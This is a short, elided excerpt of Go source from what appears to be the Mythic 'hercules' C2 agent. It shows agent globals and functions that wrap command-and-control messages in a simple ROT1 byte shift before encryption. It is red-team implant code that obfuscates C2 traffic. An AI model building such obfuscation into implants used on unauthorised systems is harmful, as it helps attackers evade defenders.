...
import (
	...
	"github.com/MythicAgents/hercules/Payload_Type/hercules/agent_code/pkg/utils/functions"
...
var (
	...
	UUID                  string
	UseCustomC2FormatBool = false
	UseCustomC2Format     string
	MythicID              = ""
...
func MakeCustomC2Format(data []byte) []byte {
	// we're going to modify the JSON to be something custom before we encrypt it
	// Simply ROT1
...
func UnMakeCustomC2Format(data []byte) []byte {
	for index, val := range data {
		data[index] = val - 1
	}
	return data
